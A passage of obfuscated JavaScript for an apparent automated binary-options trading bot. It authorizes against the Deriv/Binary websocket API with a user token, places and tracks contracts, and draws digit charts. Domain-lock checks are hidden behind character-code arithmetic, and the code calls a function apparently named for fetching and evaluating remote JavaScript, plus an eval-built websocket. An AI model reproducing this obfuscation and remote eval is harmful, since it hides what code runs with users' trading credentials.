1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {
    if (!_0x30d901.authorize.scopes.includes("read") || !_0x30d901.authorize.scopes.includes("trade")) {
      alert("Make sure you activate 'READ' & 'TRADE' when you create token");
      ubahbtn_run("run");
      return;
    }
    _0x1a19x7.send(JSON.stringify({
      subscribe: 1,
      balance: 1,
      passthrough: {
        app_id: app_id
      }
    }));
    sedangAuthorize = true;
    masterCurrency = _0x30d901.authorize.currency;
    loginID = _0x30d901.authorize.loginid;
    isVirtual = _0x30d901.authorize.is_virtual;
    summary_account.innerText = "***" + loginID.slice(-2);
    summary_balance.innerText = _0x30d901.authorize.balance + " " + masterCurrency;
    updateStatusBotRunning("Bot is running.");
    if (!sudahRunOnceAtStart) {
      getAndEvalJavaScriptCode();
    }
  } else if (_0x30d901.msg_type === "b" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 - 1) + "l" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 - 1) + "nc" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 21) && window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109) && _0x30d901.passthrough.app_id == 18376) {
    idSubBalance = _0x30d901.subscription.id;
    summary_balance.innerText = _0x30d901.balance.balance + " " + masterCurrency;
  } else if (_0x30d901.msg_type === String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) - 18, "block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 5, "block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) + 5) && window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {
    if (Object.hasOwn(_0x30d901.buy, "contract_id")) {
      updateStepper(3);
      prContract.push(_0x30d901.buy.contract_id);
      tempPrContractPos = prContract.indexOf(_0x30d901.buy.contract_id);
      rowActive[tempPrContractPos] = tableSummaryTBODY.insertRow(1);
      rowActive[tempPrContractPos].insertCell(0).innerText = document.getElementById("divdatetime").innerText;
      rowActive[tempPrContractPos].insertCell(1).innerText = _0x30d901.echo_req.parameters.contract_type;
      for (i = 2; i <= 5; i++) {
        rowActive[tempPrContractPos].insertCell(i);
      }
      rowActive[tempPrContractPos].cells[4].innerText = _0x30d901.buy.buy_price;
      summary_noofruns.innerText = summary_noofruns.innerText * 1 + 1;
      saveDataContract(_0x30d901.buy.contract_id, loginID, isVirtual, _0x30d901.buy.buy_price, _0x30d901.buy.purchase_time, _0x30d901.echo_req.parameters.contract_type, _0x30d901.buy.transaction_id);
      timerStartPLANB[tempPrContractPos] = // TOLOOK
      setTimeout(() => {
        doPLANB(_0x30d901.buy.contract_id);
      }, (_0x30d901.passthrough.tempDuration * _0x30d901.passthrough.tempDetikPengali + timerStartPLANBOffset) * 1000);
    } else {}
  } else if (_0x30d901.msg_type === "sell") {} else if (_0x30d901.msg_type === "pr" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "p" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "sal_" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "pen_c" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "ntract" && window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {
    tempPrContractPos = prContract.indexOf(_0x30d901.proposal_open_contract.contract_id);
    if (tempPrContractPos == -1) {
      return;
    }
    ;
    if (!(lastTimeMasukPOC[tempPrContractPos] == undefined || _0x30d901.proposal_open_contract.current_spot_time > lastTimeMasukPOC[tempPrContractPos])) {
      return;
    }
    ;
    lastTimeMasukPOC[tempPrContractPos] = _0x30d901.proposal_open_contract.current_spot_time;
    if (_0x30d901.proposal_open_contract.entry_tick_display_value != undefined) {
      rowActive[tempPrContractPos].cells[2].innerText = _0x30d901.proposal_open_contract.entry_tick_display_value;
    }
    sedangPantauContractPos = tempPrContractPos;
    isContractValidToSell[sedangPantauContractPos] = _0x30d901.proposal_open_contract.is_valid_to_sell;
    sellProfitLoss[sedangPantauContractPos] = _0x30d901.proposal_open_contract.profit;
    if (_0x30d901.proposal_open_contract.exit_tick_display_value != undefined && (_0x30d901.proposal_open_contract.is_sold || _0x30d901.proposal_open_contract.is_expired || _0x30d901.proposal_open_contract.is_settleable || _0x30d901.proposal_open_contract.current_spot_time > _0x30d901.proposal_open_contract.expiry_time || _0x30d901.proposal_open_contract.status != "open")) {
      if (Object.hasOwn(_0x30d901, "subscription")) {
        _0x1a19x7.send(JSON.stringify({
          forget: _0x30d901.subscription.id,
          passthrough: {
            app_id: app_id
          }
        }));
      }
      _0x1a19x7.send(JSON.stringify({
        statement: 1,
        limit: 1
      }));
      updateResult(_0x30d901.proposal_open_contract.contract_id, _0x30d901.proposal_open_contract.status, _0x30d901.proposal_open_contract.profit, _0x30d901.proposal_open_contract.buy_price, _0x30d901.proposal_open_contract.payout, _0x30d901.proposal_open_contract.contract_type, _0x30d901.proposal_open_contract.entry_tick_time, _0x30d901.proposal_open_contract.entry_tick, _0x30d901.proposal_open_contract.entry_tick_display_value, _0x30d901.proposal_open_contract.exit_tick_time, _0x30d901.proposal_open_contract.exit_tick, _0x30d901.proposal_open_contract.exit_tick_display_value, _0x30d901.proposal_open_contract.barrier);
      return true;
    }
    func$1$9$8$7$SellConditions();
  } else {}
};
const _0x1903 = String.fromCodePoint(115, 115, 58, 47, 47, 119, 115, 46, 100) + String.fromCodePoint(101, 114) + _0x1902;
const messageResponseV = _0x5ee8d1 => {
  const _0x440b95 = JSON.parse(_0x5ee8d1.data);
  if (_0x440b95.error !== undefined) {
    if (["f" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "rget", "forget_all", "proposal_open_contract"].includes(_0x440b95.msg_type)) {} else {
      console.log("[Slave] msg_type: ", _0x440b95.msg_type, " | Error : ", _0x440b95.error.message);
      if (_0x440b95.msg_type === "auth" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "rize") {
        alert("[Slave] " + _0x440b95.error.message);
        ubahbtn_run("run");
      }
      if (_0x440b95.msg_type === "auth" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "rize" || _0x440b95.error.message.includes("Please log in")) {
        // TOLOOK
        setTimeout(() => {
          _0x1a19x8 = eval(" n" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 21) + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) + 3) + " Rec" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "nnect" + String.fromCodePoint(105, 110) + "gW" + _0x1904);
          _0x1a19x8.addEventListener(String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "pen", openResponseV);
          _0x1a19x8.addEventListener("message", messageResponseV);
          _0x1a19x8.addEventListener("close", closeResponseV);
        }, 2000);
      } else if (_0x440b95.msg_type === "buy") {
        writeLog("", _0x440b95.error.message);
      } else if (_0x440b95.msg_type === "sell" && _0x440b95.error != "This contract was not found among your open positions.") {
        writeLog("", _0x440b95.error.message);
      }
    }
  } else if (_0x440b95.msg_type === "f" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "rget") {} else if (_0x440b95.msg_type === String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) * 2 + 3, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 62, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) + _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) - 2279, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) - _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) + 102) && window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {
    if (_0x440b95.authorize.is_virtual != 1) {
      alert("[Slave] Please do not use REAL account as SLAVE !!!");
      ubahbtn_run("run");
      return;
    }
    if (!_0x440b95.authorize.scopes.includes("read") || !_0x440b95.authorize.scopes.includes("trade")) {
      alert("[Slave] Make sure you activate 'READ' & 'TRADE' when you create token");
      ubahbtn_run("run");
      return;
    }
    sedangAuthorizeV = true;
    slaveCurrency = _0x440b95.authorize.currency;
    slaveAuthorized = true;
    slaveLoginID = _0x440b95.authorize.loginid;
    slaveIsVirtual = _0x440b95.authorize.is_virtual;
  } else if (_0x440b95.msg_type === String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) - 18, "block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 5, "block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(154 % 12) + 5) && window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {
    if (Object.hasOwn(_0x440b95.buy, "contract_id")) {
      updateStepper(3);
      prContract.push(_0x440b95.buy.contract_id);
      tempPrContractPos = prContract.indexOf(_0x440b95.buy.contract_id);
      rowActive[tempPrContractPos] = tableSummaryTBODY.insertRow(1);
      rowActive[tempPrContractPos].insertCell(0).innerText = document.getElementById("divdatetime").innerText;
      rowActive[tempPrContractPos].insertCell(1).innerText = _0x440b95.echo_req.parameters.contract_type;
      for (i = 2; i <= 5; i++) {
        rowActive[tempPrContractPos].insertCell(i);
      }
      rowActive[tempPrContractPos].cells[4].innerText = "Virtual";
      timerStartPLANB[tempPrContractPos] = // TOLOOK
      setTimeout(() => {
        doPLANB(_0x440b95.buy.contract_id);
      }, (_0x440b95.passthrough.tempDuration * _0x440b95.passthrough.tempDetikPengali + timerStartPLANBOffset) * 1000);
    } else {}
  } else if (_0x440b95.msg_type === "sell") {} else if (_0x440b95.msg_type === "pr" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "p" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "sal_" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "pen_c" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "ntract" && window.location.protocol == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(175 % 44) * 2 + 6, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(681 % 91) * 2 + 2, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 3 - 34, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) * 2 + 14, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) + 66, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) + 9) && "block.ezbinarybot.com".replace("www.", "").replace("block.", "") == String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 + 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(117 % 73) + 65, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(271 % 57) * 3 - 49, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(275 % 115) * 2 + 5, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(343 % 99) * 2 + 12, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(555 % 127) * 2 - 1, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(322 % 55) * 2 + 16) + "ybo" + String.fromCodePoint(_0x1a19x7.url.replace("deriv", "binary").charCodeAt(310 % 88) + 67, 46, _0x1a19x7.url.replace("deriv", "binary").charCodeAt(556 % 73) * 2 - 1, 111, 109)) {
    tempPrContractPos = prContract.indexOf(_0x440b95.proposal_open_contract.contract_id);
    if (tempPrContractPos == -1) {
      return;
    }
    ;
    if (!(lastTimeMasukPOC[tempPrContractPos] == undefined || _0x440b95.proposal_open_contract.current_spot_time > lastTimeMasukPOC[tempPrContractPos])) {
      return;
    }
    ;
    lastTimeMasukPOC[tempPrContractPos] = _0x440b95.proposal_open_contract.current_spot_time;
    if (_0x440b95.proposal_open_contract.entry_tick_display_value != undefined) {
      rowActive[tempPrContractPos].cells[2].innerText = _0x440b95.proposal_open_contract.entry_tick_display_value;
    }
    sedangPantauContractPos = tempPrContractPos;
    isContractValidToSell[sedangPantauContractPos] = _0x440b95.proposal_open_contract.is_valid_to_sell;
    sellProfitLoss[sedangPantauContractPos] = _0x440b95.proposal_open_contract.profit;
    if (_0x440b95.proposal_open_contract.exit_tick_display_value != undefined && (_0x440b95.proposal_open_contract.is_sold || _0x440b95.proposal_open_contract.is_expired || _0x440b95.proposal_open_contract.is_settleable || _0x440b95.proposal_open_contract.current_spot_time > _0x440b95.proposal_open_contract.expiry_time || _0x440b95.proposal_open_contract.status != "open")) {
      if (Object.hasOwn(_0x440b95, "subscription")) {
        _0x1a19x8.send(JSON.stringify({
          forget: _0x440b95.subscription.id,
          passthrough: {
            app_id: app_id
          }
        }));
      }
      _0x1a19x8.send(JSON.stringify({
        statement: 1,
        limit: 1
      }));
      updateResultV(_0x440b95.proposal_open_contract.contract_id, _0x440b95.proposal_open_contract.status, _0x440b95.proposal_open_contract.profit, _0x440b95.proposal_open_contract.buy_price, _0x440b95.proposal_open_contract.payout, _0x440b95.proposal_open_contract.contract_type, _0x440b95.proposal_open_contract.entry_tick_time, _0x440b95.proposal_open_contract.entry_tick, _0x440b95.proposal_open_contract.entry_tick_display_value, _0x440b95.proposal_open_contract.exit_tick_time, _0x440b95.proposal_open_contract.exit_tick, _0x440b95.proposal_open_contract.exit_tick_display_value, _0x440b95.proposal_open_contract.barrier);
      return true;
    }
    func$1$9$8$7$SellConditions();
  } else {}
};
const forgetAllTicks = () => {
  sedangForgetAllTicks = true;
  _0x1a19x7.send(JSON.stringify({
    forget: idSubTicksHistory,
    passthrough: {
      app_id: app_id
    }
  }));
  _0x1a19x7.send(JSON.stringify({
    forget_all: "ticks",
    passthrough: {
      app_id: app_id,
      next: "hist" + String.fromCodePoint("block.ezbinarybot.com".replace("www.", "").replace("block.", "").charCodeAt(305 % 76) - 11) + "ryTicks"
    }
  }));
};
const forgetTicks = _0x5a4edb => {
  _0x1a19x7.send(JSON.stringify({
    forget: _0x5a4edb,
    passthrough: {
      app_id: app_id
    }
  }));
};
const subscribeTicks = (_0x3ccdb3, _0x4610b4, _0x3f77a2) => {
  _0x1a19x7.send(JSON.stringify({
    subscribe: 1,
    ticks_history: _0x3f77a2,
    adjust_start_time: 1,
    count: inpNOTicks.value < 1001 ? 1001 : inpNOTicks.value,
    end: "latest",
    start: 1,
    style: "ticks",
    passthrough: {
      app_id: app_id,
      status_nya: _0x3ccdb3,
      index_nya: _0x4610b4
    }
  }));
};
const subscribeCandles = _0x12f6c9 => {
  _0x1a19x7.send(JSON.stringify({
    ticks_history: mainSymbol,
    adjust_start_time: 1,
    count: 10,
    end: "latest",
    start: 1,
    style: "candles",
    granularity: _0x12f6c9,
    passthrough: {
      app_id: app_id
    }
  }));
};
const createChartLast10Dig_Digit = () => {
  const _0x1fc570 = document.getElementById("chart_last10dig_digit").getContext("2d");
  const _0x13c26b = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartLast10Dig_Digit = new Chart(_0x1fc570, {
    type: "line",
    data: {
      labels: _0x13c26b,
      datasets: [{
        label: "Digit + Digit Move",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Digit + Digit Move",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (_0x52d720) {
              if (_0x52d720.tick.value > 0) {
                return "#2e2e2e";
              } else if (_0x52d720.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartLast10Dig_Digit();
const createChartLast10Dig_Change = () => {
  const _0x387865 = document.getElementById("chart_last10dig_change").getContext("2d");
  const _0x3eac31 = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartLast10Dig_Change = new Chart(_0x387865, {
    type: "line",
    data: {
      labels: _0x3eac31,
      datasets: [{
        label: "Digit Change",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Digit Change",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (_0x2462f1) {
              if (_0x2462f1.tick.value > 0) {
                return "#2e2e2e";
              } else if (_0x2462f1.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartLast10Dig_Change();
const createChart20Cater = () => {
  const _0x361e9b = document.getElementById("chart20cater").getContext("2d");
  const _0x50322c = ["20th", "19th", "18th", "17th", "16th", "15th", "14th", "13th", "12th", "11th", "10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChart20Cater = new Chart(_0x361e9b, {
    type: "line",
    data: {
      labels: _0x50322c,
      datasets: [{
        fill: false,
        lineTension: 0,
        backgroundColor: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
        borderColor: "#fff",
        borderWidth: 1,
        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        },
        datalabels: {
          color: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          min: -10,
          max: 10,
          grid: {
            color: function (_0x168a76) {
              if (_0x168a76.tick.value > 0) {
                return "#2e2e2e";
              } else if (_0x168a76.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChart20Cater();
const createChartLast10Tick_Tick = () => {
  const _0x1fdf94 = document.getElementById("chart_last10tick_tick").getContext("2d");
  const _0x49fe82 = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartLast10Tick_Tick = new Chart(_0x1fdf94, {
    type: "line",
    data: {
      labels: _0x49fe82,
      datasets: [{
        label: "Tick + Move",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Tick + Move",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (_0x474dec) {
              if (_0x474dec.tick.value > 0) {
                return "#2e2e2e";
              } else if (_0x474dec.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartLast10Tick_Tick();
const createChartLast10Tick_Change = () => {
  const _0x4f8497 = document.getElementById("chart_last10tick_change").getContext("2d");
